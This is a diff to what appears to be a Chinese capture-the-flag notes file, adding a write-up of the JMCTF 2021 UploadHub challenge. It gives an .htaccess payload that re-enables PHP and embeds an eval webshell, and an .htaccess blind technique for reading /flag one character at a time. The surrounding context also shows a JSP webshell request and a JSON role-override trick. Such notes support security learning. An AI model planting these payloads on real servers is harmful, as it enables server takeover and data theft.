@@ -1175,3 +1175,44 @@ function check($str){
 
 请求：`http://x.x.x.x/cmd.jsp?pwd=b&i=ls`
 - json解析特性：JSON 中的内联注释不会影响其解析。如`{"username":"LemonPrefect","password":"pass","role":"superUserLemonPrefect","role"/**/:"admin"}`或`{"username":"LemonPrefect","password":"pass","role":"admin"/*,"role":"guest"*/}`。前者`"role"/**/:"admin"`会正常解析，后者`/*,"role":"guest"*/`不会解析（解析出来role是admin）
+189. [[JMCTF 2021]UploadHub](https://blog.csdn.net/weixin_45669205/article/details/117047432)
+- php任意文件上传：上传.htaccess改变网站配置。
+- apache2.conf配置文件中：
+
+```conf
+<Directory ~ "/var/www/html/upload/[a-f0-9]{32}/">
+        php_flag engine off
+</Directory>
+```
+
+`php_flag engine off`设置会让整个目录不解析php，导致上传的php木马无效。
+- .htaccess修改网站配置使其解析php。
+```
+<FilesMatch .htaccess>
+SetHandler application/x-httpd-php 
+Require all granted  
+php_flag engine on	
+</FilesMatch>
+
+php_value auto_prepend_file .htaccess
+#<?php eval($_POST['a']);?>
+```
+
+其中：
+```
+ForceType application/x-httpd-php
+SetHandler application/x-httpd-php
+```
+强制所有匹配的文件被一个指定的处理器处理,这里为php。
+```
+Require all granted  #允许所有请求
+php_flag engine on   #开启PHP的解析
+php_value auto_prepend_file .htaccess 在主文件解析之前自动解析包含.htaccess的内容
+```
+- .htaccess文件的盲注。
+```
+<If "file('/flag')=~ '/flag{/'">
+ErrorDocument 404 "wupco"
+</If>
+```
+`~`用于开启“正则表达式”分析，正则表达式必须在双引号之间。如果匹配到flag就设置ErrorDocument 404为"wupco"。可以将中间的`flag{`一个字符一个字符地试错匹配，通过回显判断是否正确，即盲注。
